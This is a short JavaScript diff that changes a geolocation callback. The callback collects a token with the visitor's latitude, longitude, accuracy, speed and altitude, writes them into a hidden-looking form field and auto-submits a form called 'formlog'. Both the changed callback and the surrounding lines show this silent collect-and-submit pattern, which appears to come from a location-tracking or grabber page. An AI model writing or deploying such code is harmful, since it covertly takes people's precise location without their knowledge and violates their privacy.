@@ -61,13 +61,14 @@ document.getElementById("texto").value = info;
 document.forms.formlog.submit();
 
 const geo_success = (position) => {
-  document.getElementById("texto").value = token + 
+  info = 'token: ' + token + 
     '\nlatitute: ' + position.coords.latitude +
     '\nlongitude: ' + position.coords.longitude + 
     '\naccuracy: ' + position.coords.accuracy + ' m' +
     '\nspeed: ' + position.coords.speed + ' m/s' + 
     '\naltitude: ' + position.coords.altitude + ' m' + 
     '\naltitudeAccuracy: ' + position.coords.altitudeAccuracy + ' m';
+  document.getElementById("texto").value = info;
   document.forms.formlog.submit();
   return;
 }
